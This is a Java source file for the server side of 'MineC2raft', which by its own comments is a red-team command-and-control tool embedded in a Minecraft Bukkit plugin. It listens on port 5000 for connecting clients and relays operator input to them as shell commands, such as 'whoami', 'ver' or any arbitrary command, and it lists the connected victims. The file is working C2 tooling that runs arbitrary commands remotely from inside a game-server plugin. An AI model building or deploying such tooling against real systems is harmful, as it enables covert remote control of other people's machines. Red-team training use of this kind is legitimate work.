package com.minec2raft.Server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.CopyOnWriteArrayList;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitScheduler;
import org.bukkit.scheduler.BukkitTask;

import com.minec2raft.BridgeConnection;

/**@author Austin Hall
 * Main server class that handles communication between multiple clients using the Client class.
 * Server code modified for compatibility with minecraft plugins
 * Utilizes the ClientHandler class to offload some work between threads, and makes this class easier to read.
 * CHATGPT was used as a LEARNING TOOL in the creation of this software.
 */
public class Server {

    //Escape codes or sommn for different colors (now changed for minecraft color coding). 
    private static final String RED = "§4";
    private static final String GREEN = "§2";
    private static final String YELLOW = "§e";
    private static final String RESET = "§f";

    private static boolean exists = false;
    private static BukkitTask connectionThread;
    
    
    private static final double VERSION_NUM = 0.02; //version number (change when I feel cheeky ;)
    public static final CopyOnWriteArrayList<ClientHandler> clients = new CopyOnWriteArrayList<>(); // array of clients as threads.

    private static ServerSocket serverSocket; //This is not just a UDP socket idiot

    /**
     * Creates a new Server object. Make only one of these plz
     */
    public Server(){
        try {
            serverSocket = new ServerSocket(5000);
            System.out.println("Server Ready.");
            exists = true;
        } catch(IOException e) {
            
            System.out.println("Creation of server Failed. " + e);
        }
    } 
    
    /**
     * runs all of the code relating to client / server communication, and handles user input for commands.
     * @throws IOException
     */
    public void runServer(JavaPlugin plugin) throws IOException {
        System.out.println(GREEN + "Server Created. Listening for clients..." + RESET);

        //schedule bukkit thread to handle communications between server any any clients

        connectionThread = Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                while(true) {
                    Socket clientSocket = serverSocket.accept();
                    System.out.println(GREEN + "Client found at: " + YELLOW + clientSocket.getPort() + RESET);

                    ClientHandler handler = new ClientHandler(clientSocket);
                    clients.add(handler);
                    handler.start(); 
                    
                    Bukkit.getScheduler().runTaskAsynchronously(plugin, handler);
                }
            } catch (IOException e) {
                System.out.println(RED + "Client thread stopped." + RESET);
            }
        });

        // Start user input listening.
        BufferedReader userReader = new BufferedReader(new InputStreamReader(System.in));
        String userIn = "";
        System.out.println(YELLOW + "Type 'coms' for a list of commands." + RESET);

        while((userIn = userReader.readLine()) != null && !userIn.equals("quit")) {
            commandHandler(userIn);
        }
    }    

    /**
     * Method that helps runServer() interpret user commands. 
     * Some special commands have been added for ease of use, and any non-special commands will be interpreted through the client's terminal.
     * @param cmd - the user input.
     */
    public static String commandHandler(String cmd) {
        String reply;
        String returnStr = "";
        switch(cmd) {
            case "os", "version":
                reply = "ver";
                returnStr = broadcast(reply, null);
                break;
            case "user", "client":
                reply = "whoami";
                returnStr = broadcast(reply, null);
                break;
            case "coms", "commands", "cmds", "HELP": 
                reply = "               ********** MineC2raft Commands ***********\n\t\t" 
                            + "os: displays the os of the client.\n\t\t"
                            + "user: displays the name of the client.\n\t\t" 
                            + "quit: exits the client port.\n\t\t" 
                            + "clients: displays all connected clients.\n\t\t"
                            + "about: about the program.\n\t"  
                            + "       ******************************************\n\n" 
                            + "WINDOWS ONLY\n(Maybe i'll add linux soon) but like lowk you can use a remote terminal \n" 
                            + "Thats all you need to know foo\n\t\t";

                System.out.println(reply);
                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                break;
            case "poop":
                for(int i = 1; i <= 100; i++) {
                    System.out.println(i + ": Poop");
                }
                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                break;
            case "about", "abt":
                reply = "\n░▒▓ MINEC2RAFT ▓▒░\n" 
                        + "Version: " + VERSION_NUM 
                        + "\nWritten by Austin Hall for RIT's Red Team.\n" 
                        + "For fun too lowk...\n\n" 
                        + "A dud?\n/give @p oak_sapling 100";
                System.out.println(reply);
                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                break;
            case "sockets", "clients", "list", "lst", "array", "arr":
                formatArrLst(); 
                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                break;                
            default: 
                returnStr = broadcast(cmd, null);
                break;  
        }
        return returnStr;
    }

    public static String broadcastDestinationHandler() {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        String response;
        formatArrLst();
        System.out.println("all: broadcast to all clients");
        try {
            response = reader.readLine();
            
            return response;
        } catch(Exception e) {

        }
        return null;
       
    }

    /** 
     * Broadcasts commands to all clients - if the message does not have "CMD: " at the start, the client WILL NOT interpret the message.
     */
    public static String broadcast(String msg, ClientHandler sender) {
        System.out.println("Made it!");

        if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
            
        }
        if(clients.isEmpty()) {
            System.out.println(RED + "No clients connected." + RESET);
            
        }
        // System.out.println("\nWhere do you want to send this command?");
        // String response = broadcastDestinationHandler();
        String response = "all";

        if(response != null) {
            if(response.equals("all")) {
                for(ClientHandler client : clients) {
                    if (client != sender) {
                        client.sendMessage("CMD: " + msg);
                        return client.getRecentLn();
                    }
                }
            } else {
                try {
                    clients.get(Integer.parseInt(response)).sendMessage("CMD: " + msg);
                    return clients.get(Integer.parseInt(response)).getRecentLn();
                } catch(Exception e) {
                    System.out.println("Not a valid option.");
                }
            }
        }
        return null;
    }

    public static void formatArrLst() {
        if(clients.size() > 0) {
            System.out.println(GREEN + "\nCurrent Connected Clients:" + RESET);
        } else {
            System.out.println(RED + "No connected clients. " + RESET);
        }
        for(int i = 0; i < clients.size(); i++) {
            System.out.println(YELLOW + i + ": " + RESET + clients.get(i).getInetAddr() + ", Port " + clients.get(i).getPort());
        }
    }

    /**
     * lets hope this correctly checks to see if we've ever made a server, so that people can't make more than one.
     * @return whether or not a server is enabled
     */
    public static boolean isEnabled() {
        return exists;
    }

    public static void stopServer() {
        try {
            serverSocket.close();

        } catch(Exception e) {
            System.out.println("Error stopping server: " + e);
        }
        
    }
}
